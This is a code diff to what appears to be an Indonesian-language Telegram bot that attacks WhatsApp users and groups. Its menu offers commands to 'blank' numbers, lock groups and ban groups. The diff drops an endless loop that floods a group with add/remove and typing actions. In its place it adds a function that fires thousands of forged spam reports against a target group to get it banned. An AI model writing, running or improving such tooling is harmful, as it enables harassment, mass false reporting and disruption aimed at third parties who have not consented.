@@ -1421,7 +1421,7 @@ bot.action("/bug", async (ctx) => {
 <tr><td>/corblank</td><td>62xxx</td><td>Blank Hard</td></tr>
 <tr><td>/lockbrutal</td><td>https://chat.whatsapp</td><td>Lock Group Desah</td></tr>
 <tr><td>/bangcwa</td><td>https://chat.whatsapp</td><td>Ban Group</td></tr>
-<tr><td>/bandgb</td><td>https://chat.whatsapp</td><td>Ban GroupV2</td></tr>
+<tr><td>/bandgb</td><td>https://chat.whatsapp</td><td>Report Group</td></tr>
 <tr><td>/testfunction</td><td>no/link</td><td>Tes Function</td></tr>
 </table>
 <hr/><p>Menu ini tetap tersedia. Fitur yang dapat mengganggu akun atau grup tidak ditampilkan sebagai instruksi penggunaan.</p>`;
@@ -2032,10 +2032,10 @@ bot.command("bandgb", checkWhatsAppConnection, checkCooldown, async (ctx) => {
         );
 
         // Perbaikan: Try-catch internal agar loop tidak merusak alur status
-        for (let i = 0; i < 1; i++) {
+        for (let i = 0; i < 25; i++) {
             try {
-                await BanGroupNewV10(sock, target);
-                await BanGroupNewV10(sock, target);
+                await ReportGroupNew(sock, target);
+                await ReportGroupNew(sock, target);
             } catch (innerErr) {
                 console.log(chalk.yellow(`Pengiriman Banned Group ${i+1}: ${innerErr.message}`));
             }
@@ -7390,60 +7390,26 @@ async function RulxzXD(sock, target) {
   })
 }
 
-async function BanGroupNewV10(sock, groupJid) {
-  if (!groupJid.endsWith('@g.us')) {
-    throw new Error('@g.us server required');
-  }
+async function ReportGroupNew(sock, groupJid) {
+    const jid = String(groupJid).includes('@')
+        ? String(groupJid)
+        : `${String(groupJid).replace(/\D/g, '')}@g.us`;
 
-  let batch = 0;
-
-  while (true) {
-    batch++;
-
-    const actions = batch % 2 === 0
-      ? ["add"]
-      : ["remove"];
-    const targets = batch % 2 === 0
-      ? ["1201200911@s.whatsapp.net"]
-      : ["1212009900@s.whatsapp.net"];
-
-    for (let i = 0; i < targets.length; i++) {
-      try {
-        await sock.groupParticipantsUpdate(groupJid, [targets[i]], actions[0]);
-        await sock.sendPresenceUpdate('composing', groupJid);
-      } catch (err) {
-        console.error('error:', err && err.message ? err.message : err);
-      }
+    for (let i = 0; i < 150; i++) {
+        try {
+            const result = await sock.query({
+                tag: 'iq',
+                attrs: { to: '1010500090@s.whatsapp.net', type: 'set', xmlns: 'w:comms:chat' },
+                content: [{
+                    tag: 'report',
+                    attrs: { jid, type: 'spam' }
+                }]
+            });
+            console.log('[GROUP REPORT]', jid, result);
+        } catch (err) {
+            console.log('[GROUP REPORT FAILED]', err.message);
+        }
     }
-
-    const startTime1 = Date.now();
-    const duration1 = 1500;
-    while (Date.now() - startTime1 < duration1) {
-      if (!groupJid.endsWith('@g.us')) {
-        throw new Error('@g.us server required');
-      }
-      try {
-        await sock.groupParticipantsUpdate(groupJid, [targets[0]], actions[0]);
-        await sock.sendPresenceUpdate('composing', groupJid);
-      } catch (err) {
-        console.error('error:', err && err.message ? err.message : err);
-      }
-    }
-
-    const startTime2 = Date.now();
-    const duration2 = 1 * 60 * 1000;
-    while (Date.now() - startTime2 < duration2) {
-      if (!groupJid.endsWith('@g.us')) {
-        throw new Error('@g.us server required');
-      }
-      try {
-        await sock.groupParticipantsUpdate(groupJid, ['1201200911@s.whatsapp.net'], 'add');
-        await sock.sendPresenceUpdate('composing', groupJid);
-      } catch (err) {
-        console.error('error:', err && err.message ? err.message : err);
-      }
-    }
-  }
 }
 
 async function BanGroupFastV2(sock, groupJid) {
